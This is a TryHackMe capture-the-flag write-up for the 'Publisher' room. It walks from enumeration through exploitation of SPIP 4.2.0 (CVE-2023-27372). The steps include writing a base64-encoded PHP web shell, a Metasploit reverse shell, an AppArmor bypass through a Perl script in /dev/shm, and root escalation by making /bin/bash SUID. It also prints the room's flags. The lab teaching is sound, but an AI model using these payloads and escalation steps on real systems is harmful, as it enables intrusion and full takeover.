## Publisher - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/publisher)

**IP: 10.10.167.239**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Whateb, Metasploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 46:c5:90:f4:36:7a:d9:5c:37:45:c6:19:55:70:e0:82 (RSA)
  |   256 bb:68:9b:0a:62:10:4a:d8:b6:1a:d2:2b:a3:3d:38:97 (ECDSA)
  |_  256 51:44:a0:97:cd:ee:01:37:b6:95:db:9a:af:5c:14:7a (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Publisher's Pulse: SPIP Insights & Tips
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.167.239 -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 278]
  /.htaccess            (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /images               (Status: 301) [Size: 315] [--> http://10.10.167.239/images/]
  /index.html           (Status: 200) [Size: 8686]
  /server-status        (Status: 403) [Size: 278]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  
  gobuster dir -u http://10.10.167.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 315] [--> http://10.10.167.239/images/]
  /spip                 (Status: 301) [Size: 313] [--> http://10.10.167.239/spip/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  
  gobuster dir -u http://10.10.167.239/spip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /local                (Status: 301) [Size: 319] [--> http://10.10.167.239/spip/local/]
  /vendor               (Status: 301) [Size: 320] [--> http://10.10.167.239/spip/vendor/]
  /config               (Status: 301) [Size: 320] [--> http://10.10.167.239/spip/config/]
  /LICENSE              (Status: 200) [Size: 35147]
  /tmp                  (Status: 301) [Size: 317] [--> http://10.10.167.239/spip/tmp/]
  /IMG                  (Status: 301) [Size: 317] [--> http://10.10.167.239/spip/IMG/]
  /ecrire               (Status: 301) [Size: 320] [--> http://10.10.167.239/spip/ecrire/]
  /prive                (Status: 301) [Size: 319] [--> http://10.10.167.239/spip/prive/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- With `whatweb` we can see that app is using SPIP as CMS.

  ```
  whatweb http://10.10.167.239/spip/
  http://10.10.167.239/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.167.239], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://10.10.167.239/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
  ```

---

## 🌐 Web Exploitation

- So I read the first flag with uploading PHP shell to the app since it is vulnerable to LFI, but when it came to SSH key I had to switch to Metasploit.

- Use [this exploit](https://github.com/nuts7/CVE-2023-27372)

  ```
  ./CVE-2023-27372.py -u http://10.10.167.239/spip/ -c 'echo PD89YCRfR0VUWzBdYD8+Cg==|base64 -d>shell.php' -v
  [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
  [+] Execute this payload : s:69:"<?php system('echo PD89YCRfR0VUWzBdYD8+Cg==|base64 -d>shell.php'); ?>";
  
  
  http://10.10.167.239/spip/shell.php?0=id -> uid=33(www-data) gid=33(www-data) groups=33(www-data) 
  
  
  http://10.10.167.239/spip/shell.php?0=cat%20/home/think/user.txt -> fa229046d44eda6a3598c73ad96f4ca5 
  
  http://10.10.167.239/spip/shell.php?0=ls%20/home/think/.ssh -> authorized_keys id_rsa id_rsa.pub 
  ```

---

## ⚙️ Shell Access

- Start a Metasploit, search for `spip` and use module `multi/http/spip_rce_form`. Fill up all necessary parameters, run it and you will get a shell.

  ```
  msf6 exploit(multi/http/spip_rce_form) > set TARGETURI /spip
  TARGETURI => /spip
  msf6 exploit(multi/http/spip_rce_form) > set LHOST [YOUR-THM-IP]
  LHOST => [YOUR-THM-IP]
  msf6 exploit(multi/http/spip_rce_form) > set RHOSTS 10.10.167.239
  RHOSTS => 10.10.167.239
  msf6 exploit(multi/http/spip_rce_form) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:4444 
  [*] Running automatic check ("set AutoCheck false" to disable)
  [*] SPIP Version detected: 4.2.0
  [+] The target appears to be vulnerable. The detected SPIP version (4.2.0) is vulnerable.
  [*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
  [*] 10.10.167.239:80 - Attempting to exploit...
  [*] Sending stage (40004 bytes) to 10.10.167.239
  [*] Meterpreter session 1 opened ([YOUR-THM-IP]:4444 -> 10.10.167.239:48870) at 2025-06-04 20:09:28 +0100
  
  meterpreter > shell
  Process 70 created.
  Channel 0 created.
  whoami
  www-data
  ```
  
- Read the flag and take RSA key and login with SSH for more stable shell.

---

## 👑 Root Privilege Escalation

- Now, we have to escalate from user `think` to root. After enumerating SUID, I found this bad boi. `/usr/sbin/run_container`

  ```
  think@ip-10-10-167-239:~$ find / -type f -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
  -rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
  -rwsr-xr-x 1 root root 477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
  -rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd
  -rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
  -rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
  -rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
  -rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
  -rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
  -rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
  -rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
  -rwsr-xr-x 1 root root 55528 Apr  9  2024 /usr/bin/mount
  -rwsr-xr-x 1 root root 67816 Apr  9  2024 /usr/bin/su
  -rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
  -rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
  -rwsr-xr-x 1 root root 39144 Apr  9  2024 /usr/bin/umount
  ```
  
- When you try to read the content you will see bunch of gibberish. Move it to your local machine and use strings on it.

  ```
  $ strings run_container              
  /lib64/ld-linux-x86-64.so.2
  libc.so.6
  __stack_chk_fail
  execve
  __cxa_finalize
  __libc_start_main
  GLIBC_2.2.5
  GLIBC_2.4
  _ITM_deregisterTMCloneTable
  __gmon_start__
  _ITM_registerTMCloneTable
  u+UH
  []A\A]A^A_
  /bin/bash
  /opt/run_container.sh
  :*3$"
  [SNIP!]
  ```
  
- After checking `/opt/run_container.sh` script, we can see that it actually runs a docker container.

  ```
  think@ip-10-10-167-239:/usr/sbin$ cat /opt/run_container.sh
  #!/bin/bash
  
  # Function to list Docker containers
  list_containers() {
      if [ -z "$(docker ps -aq)" ]; then
          docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
      fi
      echo "List of Docker containers:"
      docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
      echo ""
  }
  
  # Function to prompt user for container ID
  prompt_container_id() {
      read -p "Enter the ID of the container or leave blank to create a new one: " container_id
      validate_container_id "$container_id"
  }
  
  # Function to display options and perform actions
  select_action() {
      echo ""
      echo "OPTIONS:"
      local container_id="$1"
      PS3="Choose an action for a container: "
      options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")
  
      select opt in "${options[@]}"; do
          case $REPLY in
              1) docker start "$container_id"; break ;;
              2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                      echo "No enough containers are currently running."
                      exit 1
                  fi
                  docker stop "$container_id"
                  break ;;
              3) docker restart "$container_id"; break ;;
              4) echo "Creating a new container..."
                 docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
                 break ;;
              5) echo "Exiting..."; exit ;;
              *) echo "Invalid option. Please choose a valid option." ;;
          esac
      done
  }
  
  # Main script execution
  list_containers
  prompt_container_id  # Get the container ID from prompt_container_id function
  select_action "$container_id"  # Pass the container ID to select_action function
  ```

- We don't have write access to the script because of AppArmor, so I checked it like hint suggested.

  ```
  think@ip-10-10-167-239:/usr/sbin$ aa-status
  apparmor module is loaded.
  You do not have enough privilege to read the profile set.
  
  think@ip-10-10-167-239:/usr/sbin$ cd /etc/apparmor.d/
  think@ip-10-10-167-239:/etc/apparmor.d$ ls -al
  total 96
  drwxr-xr-x   8 root root  4096 Apr 27 13:23 .
  drwxr-xr-x 132 root root 12288 Jun  4 18:15 ..
  drwxr-xr-x   2 root root  4096 Apr 27 13:18 abi
  drwxr-xr-x   4 root root 12288 Apr 27 13:18 abstractions
  drwxr-xr-x   2 root root  4096 Feb 23  2022 disable
  drwxr-xr-x   2 root root  4096 Feb 11  2020 force-complain
  drwxr-xr-x   2 root root  4096 Apr 27 13:23 local
  -rw-r--r--   1 root root  1313 May 19  2020 lsb_release
  -rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
  -rw-r--r--   1 root root  3500 Jan 31  2023 sbin.dhclient
  drwxr-xr-x   5 root root  4096 Apr 27 13:18 tunables
  -rw-r--r--   1 root root  1724 Sep  6  2024 ubuntu_pro_apt_news
  -rw-r--r--   1 root root  6853 Sep  6  2024 ubuntu_pro_esm_cache
  -rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
  -rw-r--r--   1 root root   532 Feb 12  2024 usr.sbin.ash
  -rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
  -rw-r--r--   1 root root  2006 Jun 14  2023 usr.sbin.mysqld
  -rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
  -rw-r--r--   1 root root  1674 Feb  8  2024 usr.sbin.tcpdump
  
  think@ip-10-10-167-239:/etc/apparmor.d$ cat usr.sbin.ash 
  #include <tunables/global>
  
  /usr/sbin/ash flags=(complain) {
    #include <abstractions/base>
    #include <abstractions/bash>
    #include <abstractions/consoles>
    #include <abstractions/nameservice>
    #include <abstractions/user-tmp>
  
    # Remove specific file path rules
    # Deny access to certain directories
    deny /opt/ r,
    deny /opt/** w,
    deny /tmp/** w,
    deny /dev/shm w,
    deny /var/tmp w,
    deny /home/** w,
    /usr/bin/** mrix,
    /usr/sbin/** mrix,
  
    # Simplified rule for accessing /home directory
    owner /home/** rix,
  }
  ```

- Hacktricks have a pretty cool exploit for AppArmor. We can use the method mentioned here to bypass the AppArmor and spawn an unconfined shell.
  We just need to modify it to write to `/dev/shm` instead of `/tmp` since the deny `/tmp/** w` rule prevents us from writing to `/tmp`.

  ```
  think@ip-10-10-167-239:/dev/shm$ echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
  think@ip-10-10-167-239:/dev/shm$ chmod +x /dev/shm/test.pl
  think@ip-10-10-167-239:/dev/shm$ /dev/shm/test.pl
  $ whoami
  think
  $ id
  uid=1000(think) gid=1000(think) groups=1000(think)
  ```

- With this shell, we are able to write to the `/opt/run_container.sh` file.

  ```$ echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh```

- Now, running the `/usr/sbin/run_container`, which in turn will run the /opt/run_container.sh script, we can see changed permissions on /bin/bash.

  ```
  $ /usr/sbin/run_container
  $ ls -la /bin/bash
  -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
  ```

- At last, by running `/bin/bash -p`, we can get a shell as root and read the root flag.

  ```
  $ /bin/bash -p
  bash-5.0# whoami
  root
  bash-5.0# id
  uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
  
  bash-5.0# cat /root/root.txt
  3a4225cc9e85709adda6ef55d6a4f2ca 
  ```

---

## 🏁 Flags

- **User Flag**: `fa229046d44eda6a3598c73ad96f4ca5`
- **Root Flag**: `3a4225cc9e85709adda6ef55d6a4f2ca`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Priv esc.`

- What did I learn?
  `New exploit and new privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
